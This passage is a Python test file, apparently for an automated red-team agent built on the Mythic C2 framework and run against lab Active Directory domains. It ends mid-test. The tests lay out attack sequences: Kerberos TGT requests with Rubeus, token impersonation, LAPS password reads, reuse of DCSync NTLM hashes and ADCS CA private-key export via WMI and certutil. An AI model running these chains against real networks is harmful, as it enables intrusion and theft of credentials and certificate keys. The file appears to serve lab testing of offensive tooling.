    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="dc01.lab.local")

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "ensure-account-kerberos-context",
            "domain": "lab.local",
            "account": "alice",
            "callback_id": "13",
        },
        {},
    )))

    assert plan["ok"] is True
    assert plan["action"]["effects"] == ["kerberos-account-context:alice@lab.local@callback:13"]
    assert [item["command"] for item in plan["commands"]] == [
        "shell",
        "shell",
        "execute_assembly",
        "make_token",
        "ticket_store_add",
        "ticket_store_list",
        "shell",
    ]
    rendered = plan["commands"][2]["parameters"]["assembly_arguments"]
    assert rendered.startswith("asktgt /user:alice /domain:lab.local")
    assert f"/aes256:{'a' * 64}" in rendered
    assert "/ptt" not in rendered
    assert plan["commands"][-1]["parameters"] == "dir \\\\dc01.lab.local\\SYSVOL"


def test_deterministic_account_context_records_only_after_logon_ticket_and_service_proof():
    mt = _make_tools()

    async def no_schema(command, callback_display_id):
        return []

    async def no_validation(command, parameters, callback_display_id):
        return None

    action = capabilities.CapabilityAction(
        name="ensure-account-kerberos-context",
        target="domain=lab.local;account=alice;callback=13",
        preconditions=["creds:alice@lab.local", "live-callback:13"],
        effects=["kerberos-account-context:alice@lab.local@callback:13"],
        intent={
            "capability": "ensure-account-kerberos-context",
            "domain": "lab.local",
            "account": "alice",
            "callback_id": "13",
        },
    )
    action_dict = asdict(action)
    logon_params = {"credential": "@cred:88", "netOnly": True}
    list_params = {"luid": ""}
    proof_params = "dir \\\\dc01.lab.local\\SYSVOL"
    base_context = {
        "capability": "ensure-account-kerberos-context",
        "target": action.target,
        "effects": list(action.effects),
        "intent": dict(action.intent),
        "action": action_dict,
        "produces": [],
        "consumes": [],
    }
    mt._deterministic_capability_command_contexts[
        mythic_tools._capability_command_key("make_token", logon_params)
    ] = {
        **base_context,
        "expected_probe": "extract_logon_context_probe",
    }
    mt._deterministic_capability_command_contexts[
        mythic_tools._capability_command_key("ticket_store_list", list_params)
    ] = {
        **base_context,
        "expected_probe": "extract_account_ticket_cache_probe",
    }
    mt._deterministic_capability_command_contexts[
        mythic_tools._capability_command_key("shell", proof_params)
    ] = {
        **base_context,
        "expected_probe": "extract_account_ticket_probe",
        "produces": ["kerberos_service_access_probe"],
    }
    mt._fetch_command_schema = no_schema
    mt._validate_command_parameters = no_validation
    ticket_list = "Cached Tickets\nClient: alice @ LAB.LOCAL\nServer: krbtgt/LAB.LOCAL"
    proof_output = " Directory of \\\\dc01.lab.local\\SYSVOL\r\nPolicies\r\nThe command completed successfully."

    with _split_issue(
        "Successfully set Primary Identity for local access and Impersonation Identity for remote access.",
        display_id=7000,
    ):
        asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", logon_params, 13, timeout=5))
    with _split_issue(ticket_list, display_id=7001):
        asyncio.run(mt.issue_task_and_waitfor_task_output("ticket_store_list", list_params, 13, timeout=5))
    with _split_issue(proof_output, display_id=7002):
        result = asyncio.run(mt.issue_task_and_waitfor_task_output("shell", proof_params, 13, timeout=5))

    assert "Directory of" in result
    assert "kerberos-account-context:alice@lab.local@callback:13" in {
        effect for hop in mt._engagement_hops for effect in hop.satisfied_effects
    }
    hop = mt._engagement_hops[-1]
    assert hop.technique == "capability:ensure-account-kerberos-context"
    assert hop.evidence["mythic_task_id"] == 7002
    assert hop.evidence["callback_id"] == 13


def test_rubeus_klist_output_marks_expected_account_ticket_context():
    mt = _make_tools()
    output = (
        "[*] Action: List Kerberos Tickets (Current User)\r\n"
        "Current LUID    : 0x1ae0916\r\n"
        "Client Name     : cersei.lannister @ SEVENKINGDOMS.LOCAL\r\n"
        "Server Name     : krbtgt/SEVENKINGDOMS.LOCAL @ SEVENKINGDOMS.LOCAL\r\n"
        "Server Name     : cifs/KINGSLANDING.SEVENKINGDOMS.LOCAL @ SEVENKINGDOMS.LOCAL\r\n"
    )

    assert mt._ticket_cache_output_has_account(output, "cersei.lannister", "sevenkingdoms.local") is True


def test_execute_capability_account_context_accumulates_ticket_cache_and_service_proof(monkeypatch):
    mt = _make_tools()
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    record_command_result = mt._record_deterministic_capability_command_result

    def record_with_mythic_make_token_parameter_rewrite(command, parameters, callback_display_id, output):
        if command != "make_token":
            record_command_result(command, parameters, callback_display_id, output)

    monkeypatch.setattr(
        mt,
        "_record_deterministic_capability_command_result",
        record_with_mythic_make_token_parameter_rewrite,
    )

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 32,
                "account": "alice",
                "realm": "lab.local",
                "type": "key",
                "credential_text": "a" * 64,
                "comment": "aes256",
            },
        ]

    mt._fetch_credentials_cached = fake_fetch_credentials
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="dc01.lab.local")
    ticket = base64.b64encode(b"A" * 80).decode()
    outputs = iter([
        "Cached Tickets\r\nClient: alice @ LAB.LOCAL\r\nServer: krbtgt/lab.local @ LAB.LOCAL\r\n",
        " Directory of \\\\dc01.lab.local\\SYSVOL\r\nPolicies\r\nThe command completed successfully.",
        f"[*] Action: Ask TGT\n[*] base64(ticket.kirbi):\n{ticket}\n",
        "Successfully impersonated local\\user for local access and lab.local\\alice for remote access.",
        "Added Ticket to Ticket Store",
        "Cached Tickets\r\nClient: alice @ LAB.LOCAL\r\nServer: krbtgt/lab.local @ LAB.LOCAL\r\n",
        " Directory of \\\\dc01.lab.local\\SYSVOL\r\nPolicies\r\nThe command completed successfully.",
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=7100):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "ensure-account-kerberos-context",
                "domain": "lab.local",
                "account": "alice",
                "callback_id": "13",
            },
            {
                "timeout": 5,
                "proof_host": "meereen.essos.local",
                "proof_resource": r"\\meereen.essos.local\C$",
            },
        )))

    assert result["ok"] is True, json.dumps(result, indent=2)
    assert result["verdict"] == "achieved"
    assert calls["issue"] == 7
    issued_params = [str(call["parameters"]) for call in calls["issued"]]
    assert not any("meereen" in params.casefold() for params in issued_params)
    assert issued_params[1] == r"dir \\dc01.lab.local\SYSVOL"
    assert issued_params[-1] == r"dir \\dc01.lab.local\SYSVOL"
    assert result["recorded_effects"] == ["kerberos-account-context:alice@lab.local@callback:13"]
    final_probe = mt._engagement_hops[-1].evidence["probe"]
    assert final_probe["account_ticket_present"] is True
    assert final_probe["service_access_proven"] is True
    context_key = mt._kerberos_account_context_key(13, "alice", "lab.local")
    assert context_key in mt._kerberos_logon_account_context_keys
    assert context_key in mt._kerberos_account_context_keys


def test_verified_account_kerberos_context_does_not_borrow_target_domain():
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="ensure-account-kerberos-context",
        target="domain=essos.local;account=administrator;callback=13",
        preconditions=[],
        effects=["kerberos-account-context:administrator@sevenkingdoms.local@callback:13"],
        intent={
            "capability": "ensure-account-kerberos-context",
            "domain": "essos.local",
            "account_domain": "sevenkingdoms.local",
            "account": "administrator",
            "callback_id": "13",
        },
    )

    assert mt._capability_account_context_domain(action, {}) == "sevenkingdoms.local"
    key = mt._record_verified_account_kerberos_context(action, {}, 13)

    assert key == mt._kerberos_account_context_key(13, "administrator", "sevenkingdoms.local")
    assert mt._kerberos_account_context_key(13, "administrator", "essos.local") not in mt._kerberos_account_context_keys


def test_deterministic_account_context_bookkeeping_uses_account_home_realm():
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="ensure-account-kerberos-context",
        target="domain=essos.local;account=administrator;callback=13",
        preconditions=[],
        effects=["kerberos-account-context:administrator@sevenkingdoms.local@callback:13"],
        intent={
            "capability": "ensure-account-kerberos-context",
            "domain": "essos.local",
            "account_domain": "sevenkingdoms.local",
            "account": "administrator",
            "callback_id": "13",
        },
    )
    logon_params = {"Credential": "@cred:91", "netOnly": True}
    ticket_params = ""
    common = {
        "capability": action.name,
        "target": action.target,
        "effects": list(action.effects),
        "action": asdict(action),
    }
    mt._deterministic_capability_command_contexts[
        mythic_tools._capability_command_key("make_token", logon_params)
    ] = {**common, "expected_probe": "extract_logon_context_probe"}
    mt._deterministic_capability_command_contexts[
        mythic_tools._capability_command_key("ticket_store_list", ticket_params)
    ] = {**common, "expected_probe": "extract_account_ticket_cache_probe"}

    mt._record_deterministic_capability_command_result(
        "make_token",
        logon_params,
        13,
        "Successfully impersonated remote identity.",
    )
    mt._record_deterministic_capability_command_result(
        "ticket_store_list",
        ticket_params,
        13,
        (
            "Cached Tickets\r\n"
            "Client: administrator @ SEVENKINGDOMS.LOCAL\r\n"
            "Server: krbtgt/sevenkingdoms.local @ SEVENKINGDOMS.LOCAL\r\n"
        ),
    )

    home_key = mt._kerberos_account_context_key(13, "administrator", "sevenkingdoms.local")
    target_key = mt._kerberos_account_context_key(13, "administrator", "essos.local")
    assert home_key in mt._kerberos_logon_account_context_keys
    assert home_key in mt._kerberos_account_context_keys
    assert target_key not in mt._kerberos_logon_account_context_keys
    assert target_key not in mt._kerberos_account_context_keys


def test_netonly_plaintext_credential_is_created_separately_from_account_key(monkeypatch):
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [{
            "id": 32,
            "account": "alice",
            "realm": "lab.local",
            "type": "key",
            "credential_text": "a" * 64,
        }]

    created = []

    async def fake_create_credential(client, credential, account, realm, comment, credential_type):
        created.append({
            "credential": credential,
            "account": account,
            "realm": realm,
            "comment": comment,
            "credential_type": credential_type,
        })
        return {"status": "success", "id": 88}

    mt._fetch_credentials_cached = fake_fetch_credentials
    monkeypatch.setattr(mythic_tools.mythic, "create_credential", fake_create_credential)

    result = asyncio.run(mt._ensure_netonly_plaintext_credential("lab.local", "SageNetOnlyContext1!"))

    assert result == {"id": 88, "status": "created"}
    assert created == [{
        "credential": "SageNetOnlyContext1!",
        "account": "sage.netonly",
        "realm": "lab.local",
        "comment": "Sage sacrificial NetOnly context; not a valid account password",
        "credential_type": "plaintext",
    }]


def test_execute_account_context_stops_after_make_token_rejects_hash(monkeypatch):
    mt = _make_tools()
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(
        0,
        result=_apollo_make_token_schema() if command == "make_token" else [],
    )
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)

    async def fake_fetch_credentials(now):
        return [{
            "id": 32,
            "account": "alice",
            "realm": "lab.local",
            "type": "key",
            "credential_text": "a" * 64,
            "comment": "aes256",
        }]

    async def fake_create_credential(client, credential, account, realm, comment, credential_type):
        return {"status": "success", "id": 88}

    mt._fetch_credentials_cached = fake_fetch_credentials
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="dc01.lab.local")
    monkeypatch.setattr(mythic_tools.mythic, "create_credential", fake_create_credential)
    ticket = base64.b64encode(b"A" * 80).decode()
    outputs = iter([
        "No tickets in current context.",
        "Access is denied.",
        f"[*] Action: Ask TGT\n[*] base64(ticket.kirbi):\n{ticket}\n",
        "Credential material is not a plaintext password.",
        "Credential material is not a plaintext password.",
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=7200):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "ensure-account-kerberos-context",
                "domain": "lab.local",
                "account": "alice",
                "callback_id": "13",
            },
            {"timeout": 5},
        )))

    assert result["ok"] is False
    assert result["verdict"] == "failed"
    assert "plaintext password" in result["reason"]
    issued_commands = [call["command_name"] for call in calls["issued"]]
    assert issued_commands[-1] == "make_token"
    assert "ticket_store_add" not in issued_commands
    make_token = calls["issued"][-1]
    assert make_token["parameters"]["Credential"] == "@cred:88"


def test_build_capability_commands_supports_managed_secret_read():
    mt = _make_tools()
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="dc01.child.lab.local")

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "read-managed-local-admin-secret",
            "account": "alice",
            "account_domain": "lab.local",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
        {},
    )))

    assert plan["ok"] is True
    assert plan["action"]["effects"] == ["managed-local-admin-secret:ws01@child.lab.local"]
    assert [command["command"] for command in plan["commands"]] == ["powerpick"]
    rendered = plan["commands"][0]["parameters"]
    assert "DirectoryServices.DirectorySearcher" in rendered
    assert "LDAP://dc01.child.lab.local/DC=child,DC=lab,DC=local" in rendered
    assert "ms-Mcs-AdmPwd" in rendered


def test_build_capability_commands_merlin_uses_inprocess_sharpview_for_managed_secret_read(monkeypatch):
    mt = _make_tools()
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="dc01.child.lab.local")

    async def fake_payload_type(callback_id):
        assert callback_id == 13
        return "merlin"

    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "read-managed-local-admin-secret",
            "account": "alice",
            "account_domain": "lab.local",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
        {},
    )))

    assert plan["ok"] is True
    assert [command["command"] for command in plan["commands"]] == ["load-assembly", "invoke-assembly"]
    load, invoke = plan["commands"]
    assert load["parameters"] == {"filename": "SharpView.exe"}
    assert load["expected_probe"] == ""
    assert invoke["parameters"]["assembly"] == "SharpView.exe"
    assert "Get-DomainComputer" in invoke["parameters"]["arguments"]
    assert "-Identity ws01.child.lab.local" in invoke["parameters"]["arguments"]
    assert invoke["expected_probe"] == "extract_managed_local_admin_secret_probe"
    assert invoke["produces"] == ["managed_local_admin_secret_probe"]
    assert invoke["consumes"] == ["kerberos_account_context"]


def test_deterministic_managed_secret_read_records_redacted_effect():
    mt = _make_tools()

    async def no_schema(command, callback_display_id):
        return []

    async def no_validation(command, parameters, callback_display_id):
        return None

    action = capabilities.CapabilityAction(
        name="read-managed-local-admin-secret",
        target="account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local;callback=13",
        preconditions=["kerberos-account-context:alice@lab.local@callback:13"],
        effects=["managed-local-admin-secret:ws01@child.lab.local"],
        intent={
            "capability": "read-managed-local-admin-secret",
            "account": "alice",
            "account_domain": "lab.local",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
    )
    params = "$s=New-Object DirectoryServices.DirectorySearcher"
    mt._deterministic_capability_command_contexts[
        mythic_tools._capability_command_key("powerpick", params)
    ] = {
        "capability": "read-managed-local-admin-secret",
        "target": action.target,
        "effects": list(action.effects),
        "intent": dict(action.intent),
        "action": asdict(action),
        "expected_probe": "extract_managed_local_admin_secret_probe",
        "produces": ["managed_local_admin_secret_probe"],
        "consumes": ["kerberos_account_context"],
    }
    mt._fetch_command_schema = no_schema
    mt._validate_command_parameters = no_validation
    output = "\n".join([
        "distinguishedname=CN=WS01,DC=child,DC=lab,DC=local",
        "ms-mcs-admpwd=CorrectHorseBatteryStaple!",
    ])

    with _split_issue(output, display_id=7101):
        result = asyncio.run(mt.issue_task_and_waitfor_task_output("powerpick", params, 13, timeout=5))

    assert "CorrectHorseBatteryStaple" in result
    assert "managed-local-admin-secret:ws01@child.lab.local" in {
        effect for hop in mt._engagement_hops for effect in hop.satisfied_effects
    }
    hop = mt._engagement_hops[-1]
    assert hop.technique == "capability:read-managed-local-admin-secret"
    assert hop.evidence["mythic_task_id"] == 7101
    assert hop.evidence["callback_id"] == 13
    assert "CorrectHorseBatteryStaple" not in json.dumps(hop.evidence)


def test_execute_capability_managed_secret_read_refreshes_stale_account_context(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [_proof_hop(
        "kerberos-account-context:alice@lab.local@callback:13",
        7000,
        callback_id="13",
        technique="capability:ensure-account-kerberos-context",
        target="domain=lab.local;account=alice;callback=13",
    )]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(
        0,
        result="dc01.child.lab.local" if domain == "child.lab.local" else "dc01.lab.local",
    )

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 32,
                "account": "alice",
                "realm": "lab.local",
                "type": "key",
                "credential_text": "a" * 64,
                "comment": "aes256",
            },
        ]

    mt._fetch_credentials_cached = fake_fetch_credentials
    ticket = base64.b64encode(b"A" * 80).decode()
    outputs = iter([
        "No tickets in current context.",
        " Directory of \\\\dc01.lab.local\\SYSVOL\r\nPolicies\r\nThe command completed successfully.",
        f"[*] Action: Ask TGT\n[*] base64(ticket.kirbi):\n{ticket}\n",
        "Successfully impersonated local\\user for local access and lab.local\\alice for remote access.",
        "Added Ticket to Ticket Store",
        "Cached Tickets\r\nClient: alice @ LAB.LOCAL\r\nServer: krbtgt/lab.local @ LAB.LOCAL\r\n",
        " Directory of \\\\dc01.lab.local\\SYSVOL\r\nPolicies\r\nThe command completed successfully.",
        "\n".join([
            "distinguishedname=CN=WS01,DC=child,DC=lab,DC=local",
            "ms-mcs-admpwd=CorrectHorseBatteryStaple!",
        ]),
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=7200):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "read-managed-local-admin-secret",
                "account": "alice",
                "account_domain": "lab.local",
                "target_host": "ws01",
                "target_domain": "child.lab.local",
                "callback_id": "13",
            },
            {"timeout": 5},
        )))

    assert result["ok"] is True, result
    assert result["verdict"] == "achieved"
    assert calls["issue"] == 8
    assert [item["command"] for item in result["issued"]] == [
        "shell",
        "shell",
        "execute_assembly",
        "make_token",
        "ticket_store_add",
        "ticket_store_list",
        "shell",
        "powerpick",
    ]
    assert result["recorded_effects"] == ["managed-local-admin-secret:ws01@child.lab.local"]
    assert "CorrectHorseBatteryStaple" not in json.dumps(mt._engagement_hops[-1].evidence)


def test_execute_capability_managed_secret_read_uses_matching_live_foothold_context():
    mt = _make_tools()
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="13",
            agent="apollo",
            host="MEEREEN",
            forest="essos.local",
            identity="jorah.mormont",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-12T12:00:00Z",
        ),
    ]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="meereen.essos.local")
    calls = {"issue": 0}
    output = "\n".join([
        "distinguishedname=CN=BRAAVOS,DC=essos,DC=local",
        "ms-mcs-admpwd=CorrectHorseBatteryStaple!",
    ])

    with _split_issue(output, calls, display_id=7200):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "read-managed-local-admin-secret",
                "account": "jorah.mormont",
                "account_domain": "essos.local",
                "target_host": "braavos",
                "target_domain": "essos.local",
                "callback_id": "13",
            },
            {"timeout": 5},
        )))

    assert result["ok"] is True, result
    assert result["verdict"] == "achieved"
    assert calls["issue"] == 1
    assert [item["command"] for item in result["issued"]] == ["powerpick"]
    assert result["recorded_effects"] == ["managed-local-admin-secret:braavos@essos.local"]


def test_live_foothold_context_match_rejects_cross_domain_identity():
    mt = _make_tools()
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="13",
            agent="apollo",
            host="MEEREEN",
            forest="essos.local",
            identity="NORTH\\jorah.mormont",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-12T12:00:00Z",
        ),
    ]

    assert mt._callback_current_identity_matches_account_context(
        "13",
        "jorah.mormont",
        "essos.local",
    ) is False


def test_execute_capability_managed_secret_read_reuses_runtime_proven_account_context(monkeypatch):
    mt = _make_tools()
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    record_command_result = mt._record_deterministic_capability_command_result

    def record_with_mythic_make_token_parameter_rewrite(command, parameters, callback_display_id, output):
        if command != "make_token":
            record_command_result(command, parameters, callback_display_id, output)

    monkeypatch.setattr(
        mt,
        "_record_deterministic_capability_command_result",
        record_with_mythic_make_token_parameter_rewrite,
    )
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(
        0,
        result="dc01.child.lab.local" if domain == "child.lab.local" else "dc01.lab.local",
    )

    async def fake_fetch_credentials(now):
        return [{
            "id": 32,
            "account": "alice",
            "realm": "lab.local",
            "type": "key",
            "credential_text": "a" * 64,
            "comment": "aes256",
        }]

    mt._fetch_credentials_cached = fake_fetch_credentials
    ticket = base64.b64encode(b"A" * 80).decode()
    calls = {"issue": 0}
    outputs = iter([
        "Cached Tickets\r\nClient: alice @ LAB.LOCAL\r\nServer: krbtgt/lab.local @ LAB.LOCAL\r\n",
        " Directory of \\\\dc01.lab.local\\SYSVOL\r\nPolicies\r\nThe command completed successfully.",
        f"[*] Action: Ask TGT\n[*] base64(ticket.kirbi):\n{ticket}\n",
        "Successfully impersonated local\\user for local access and lab.local\\alice for remote access.",
        "Added Ticket to Ticket Store",
        "Cached Tickets\r\nClient: alice @ LAB.LOCAL\r\nServer: krbtgt/lab.local @ LAB.LOCAL\r\n",
        " Directory of \\\\dc01.lab.local\\SYSVOL\r\nPolicies\r\nThe command completed successfully.",
        "\n".join([
        "distinguishedname=CN=WS01,DC=child,DC=lab,DC=local",
        "ms-mcs-admpwd=CorrectHorseBatteryStaple!",
        ]),
    ])

    with _split_issue(lambda: next(outputs), calls, display_id=7200):
        context_result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "ensure-account-kerberos-context",
                "domain": "lab.local",
                "account": "alice",
                "callback_id": "13",
            },
            {"timeout": 5},
        )))
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "read-managed-local-admin-secret",
                "account": "alice",
                "account_domain": "lab.local",
                "target_host": "ws01",
                "target_domain": "child.lab.local",
                "callback_id": "13",
            },
            {"timeout": 5},
        )))

    assert context_result["ok"] is True, context_result
    assert result["ok"] is True, json.dumps(result, indent=2)
    assert result["verdict"] == "achieved"
    assert calls["issue"] == 8
    assert [item["command"] for item in result["issued"]] == ["powerpick"]
    assert result["recorded_effects"] == ["managed-local-admin-secret:ws01@child.lab.local"]


def test_read_managed_secret_imports_plaintext_credential(monkeypatch):
    mt = _make_tools()
    imported = {}

    async def fake_import(material, source_task_id=""):
        imported["material"] = material
        imported["source_task_id"] = source_task_id
        return [{"id": 91, "account": "Administrator", "realm": "ws01.child.lab.local"}]

    monkeypatch.setattr(mt, "_import_credential_material", fake_import)

    refs = asyncio.run(mt._import_capability_credential_material(
        capabilities.CapabilityAction(
            name="read-managed-local-admin-secret",
            target="account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local;callback=13",
            effects=["managed-local-admin-secret:ws01@child.lab.local"],
            intent={
                "capability": "read-managed-local-admin-secret",
                "target_host": "ws01",
                "target_domain": "child.lab.local",
            },
        ),
        {},
        "ms-mcs-admpwd=CorrectHorseBatteryStaple!",
        7101,
    ))

    assert refs == [{"id": 91, "account": "Administrator", "realm": "ws01.child.lab.local"}]
    assert imported["source_task_id"] == 7101
    assert imported["material"] == [{
        "account": "Administrator",
        "realm": "ws01.child.lab.local",
        "credential": "CorrectHorseBatteryStaple!",
        "secret_type": "managed-local-admin-secret",
        "credential_type": "plaintext",
    }]


def test_select_account_credential_recovers_from_recorded_dcsync_task(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [_proof_hop(
        r"creds:sevenkingdoms\cersei.lannister@sevenkingdoms.local",
        8901,
        callback_id="13",
        technique="dcsync-user",
        target=r"sevenkingdoms\cersei.lannister@sevenkingdoms.local",
    )]
    mt._fetch_credentials_cached = lambda now: asyncio.sleep(0, result=[])
    mt._fetch_plain_task_output = lambda task_id: asyncio.sleep(
        0,
        result=(
            "Object RDN : cersei.lannister\n"
            "Credentials:\n"
            "  Hash NTLM: c247f62516b53893c7addcf8c349954b\n"
        ),
    )
    imported = {}

    async def fake_import(material, source_task_id=""):
        imported["material"] = material
        imported["source_task_id"] = source_task_id
        return [{"id": 91, "account": "cersei.lannister", "realm": "sevenkingdoms.local"}]

    monkeypatch.setattr(mt, "_import_credential_material", fake_import)

    credential = asyncio.run(mt._select_account_credential(
        "sevenkingdoms.local",
        "cersei.lannister",
    ))

    assert credential == {
        "credential": "c247f62516b53893c7addcf8c349954b",
        "key_type": "rc4",
    }
    assert imported["source_task_id"] == 8901
    assert imported["material"][0]["account"] == "cersei.lannister"
    assert imported["material"][0]["realm"] == "sevenkingdoms.local"


def test_managed_secret_selector_recovers_from_recorded_task(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [_proof_hop(
        "managed-local-admin-secret:ws01@child.lab.local",
        7101,
        callback_id="13",
        technique="capability:read-managed-local-admin-secret",
        target="account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local;callback=13",
    )]
    mt._fetch_credentials_cached = lambda now: asyncio.sleep(0, result=[])
    mt._fetch_plain_task_output = lambda task_id: asyncio.sleep(
        0,
        result="distinguishedname=CN=WS01,DC=child,DC=lab,DC=local\nms-mcs-admpwd=CorrectHorseBatteryStaple!",
    )
    imported = {}

    async def fake_import(material, source_task_id=""):
        imported["material"] = material
        imported["source_task_id"] = source_task_id
        return [{"id": 91, "account": "Administrator", "realm": "ws01.child.lab.local"}]

    monkeypatch.setattr(mt, "_import_credential_material", fake_import)

    credential = asyncio.run(mt._select_managed_local_admin_credential(
        "ws01",
        "child.lab.local",
        "Administrator",
    ))

    assert credential == {
        "id": 91,
        "account": "administrator",
        "realm": "ws01.child.lab.local",
        "credential": "CorrectHorseBatteryStaple!",
    }
    assert imported["source_task_id"] == 7101


def test_build_capability_commands_adcs_ca_export_uses_current_context_powerpick(monkeypatch):
    mt = _make_tools()

    async def fake_select(target_host, target_domain, local_account):
        return {
            "id": 91,
            "account": local_account,
            "realm": f"{target_host}.{target_domain}",
            "credential": "CorrectHorseBatteryStaple!",
        }

    async def fake_ensure_tool_uploaded(binary_filename):
        return json.dumps({
            "status": "already_present",
            "binary_filename": binary_filename,
            "file_uuid": "sharpdpapi-file-uuid",
        })

    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
    monkeypatch.setattr(mt, "ensure_tool_uploaded", fake_ensure_tool_uploaded)

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "adcs-ca-private-key-export",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "13",
        },
        {},
    )))

    assert plan["ok"] is True
    assert [item["command"] for item in plan["commands"]] == ["powerpick"]
    script = plan["commands"][0]["parameters"]
    assert "Invoke-WmiMethod -Class Win32_Process -Name Create" in script
    assert "New-PSDrive -Name SAGECA" in script
    assert "-Credential $cred" not in script
    assert "New-Object System.Management.Automation.PSCredential" not in script


def test_execute_capability_rejects_wrong_host_ca_export_scope(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [
        _proof_hop("managed-local-admin-secret:braavos@essos.local", 7201, callback_id="13"),
        _proof_hop("local-admin:braavos@essos.local", 7202, callback_id="13"),
        _proof_hop("remote-exec:braavos@essos.local", 7203, callback_id="13"),
    ]

    async def no_matching_secret(target_host, target_domain, local_account):
        return {}

    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", no_matching_secret)

    result = json.loads(asyncio.run(mt.execute_capability(
        {
            "capability": "adcs-ca-private-key-export",
            "target_host": "meereen",
            "target_domain": "essos.local",
            "callback_id": "13",
        },
        {"timeout": 5},
    )))

    assert result["ok"] is False
    assert result["issued"] == []
    assert "local-admin:meereen@essos.local" in result["missing"]
    assert "remote-exec:meereen@essos.local" in result["missing"]
    assert "another host" in result["reason"]


def test_build_capability_commands_adcs_ca_export_uses_wmiexecute_after_remote_exec(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [
        _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
        _proof_hop("local-admin:ca01@lab.local", 7302, callback_id="13"),
    ]

    async def fake_select(target_host, target_domain, local_account):
        return {
            "id": 91,
            "account": local_account,
            "realm": f"{target_host}.{target_domain}",
            "credential": "CorrectHorseBatteryStaple!",
        }

    async def fake_ensure_tool_uploaded(binary_filename):
        return json.dumps({
            "status": "already_present",
            "binary_filename": binary_filename,
            "file_uuid": "sharpdpapi-file-uuid",
        })

    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
    monkeypatch.setattr(mt, "ensure_tool_uploaded", fake_ensure_tool_uploaded)

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "adcs-ca-private-key-export",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "13",
        },
        {},
    )))

    assert plan["ok"] is True
    assert [item["command"] for item in plan["commands"]] == ["wmiexecute", "cat"]
    command = plan["commands"][0]
    assert command["expected_probe"] == ""
    assert command["parameters"]["host"] == "ca01.lab.local"
    assert command["parameters"]["username"] == "Administrator"
    assert command["parameters"]["password"] == "CorrectHorseBatteryStaple!"
    assert command["parameters"]["domain"] == "ca01"
    encoded = command["parameters"]["command"].split("-EncodedCommand ", 1)[1]
    script = base64.b64decode(encoded).decode("utf-16le")
    assert "Invoke-WmiMethod" not in script
    assert "Start-Sleep -Seconds 45" not in script
    assert "certutil.exe -f -p" in script
    assert "CA_EXPORT_STATUS=OK" in script
    assert "PFX_BASE64=" in script
    readback = plan["commands"][1]
    assert readback["expected_probe"] == "extract_adcs_ca_private_key_probe"
    assert readback["parameters"] == {
        "path": r"\\ca01.lab.local\C$\Windows\Temp\sage_ca_export_ca01_13.txt",
    }


def test_build_capability_commands_adcs_ca_export_apollo_defaults_to_token_backed_wmiexecute(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [
